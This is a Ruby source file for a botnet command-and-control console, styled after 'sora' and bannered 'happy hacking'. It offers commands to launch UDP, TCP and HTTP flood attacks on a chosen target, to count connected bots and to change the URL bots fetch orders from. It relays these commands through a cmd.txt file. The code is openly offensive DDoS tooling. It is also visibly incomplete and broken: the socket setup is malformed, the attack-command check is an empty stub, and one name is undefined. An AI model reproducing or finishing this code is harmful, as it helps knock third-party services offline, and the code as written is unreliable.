require 'socket'

server = TCPSocket.new "localhost" 45678
cmd = ''
loop do

  master = server.accept
  while (cmd != 'exit')
    master.print "\033[41m ██░ ██  ▄▄▄       ██▓███   ██▓███ ▓██   ██▓    ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀ ██▓ ███▄    █   ▄████ \n"+
                 "▓██░ ██▒▒████▄    ▓██░  ██▒▓██░  ██▒▒██  ██▒   ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒\n"+
                 "▒██▀▀██░▒██  ▀█▄  ▓██░ ██▓▒▓██░ ██▓▒ ▒██ ██░   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░\n"+
                 "░▓█ ░██ ░██▄▄▄▄██ ▒██▄█▓▒ ▒▒██▄█▓▒ ▒ ░ ▐██▓░   ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓\n"+
                 "░▓█▒░██▓ ▓█   ▓██▒▒██▒ ░  ░▒██▒ ░  ░ ░ ██▒▓░   ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒\n"+
                 " ▒ ░░▒░▒ ▒▒   ▓▒█░▒▓▒░ ░  ░▒▓▒░ ░  ░  ██▒▒▒     ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ \n"+
                 " ▒ ░▒░ ░  ▒   ▒▒ ░░▒ ░     ░▒ ░     ▓██ ░▒░     ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ \n"+
                 " ░  ░░ ░  ░   ▒   ░░       ░░       ▒ ▒ ░░      ░  ░░ ░  ░   ▒   ░        ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ \n"+
                 " ░  ░  ░      ░  ░                  ░ ░         ░  ░  ░      ░  ░░ ░      ░  ░    ░           ░       ░ \033[0m\n\n"

                 print "sora > "
                 cmd = master.gets
                 split = cmd.split(' ')

                 if cmd == "help"
                   master.puts "udp <target> <time (ms)> <threads>        Perform a UDP flood on <target> for <time> milliseconds using <threads> threads per system"
                   master.puts "tcp <target> <port> <time (ms)> <threads> Perform a TCP flood on <target>:<port> for <time> ms using <threads> threads"
                   master.puts "http <target> <time (ms)> <threads>       Perform a HTTP flood on <target> for <time> ms using <threads> threads"
                   master.puts "botcount                                  Shows how many bots are connected"
                   master.puts
                   master.puts "urlup <newurl>                            Update the url for bots to get connections from"
                   master.puts
                   master.puts "clear                                     Clear bot command (always do this after an attack command)"
                   master.puts
                   next
                 elsif cmd == "botcount"
                   `wc -l bots.txt`
                 elsif cmd.include? "udp" || cmd.include? "tcp" || cmd.include? "http"
                   writeCmd(cmd) if checkAttackCmd(cmd)
                 elsif cmd == "urlup" && split.length == 2
                   writeCmd(cmd)
                 elsif cmd == clear
                   writeCmd("NONE")
                 else
                   master.puts "\033[31m Unknown command: #{cmd}\033[0m"
                 end


  end
  master.puts "Bye bye!"
  master.close

end


def checkAttackCmd(command)
  # TODO
  # NOTE returns boolean
end

def writeCmd(command)
  cmdf = File.new("cmd.txt", 'w')
  cmdf.print(command)
  cmdf.close
end
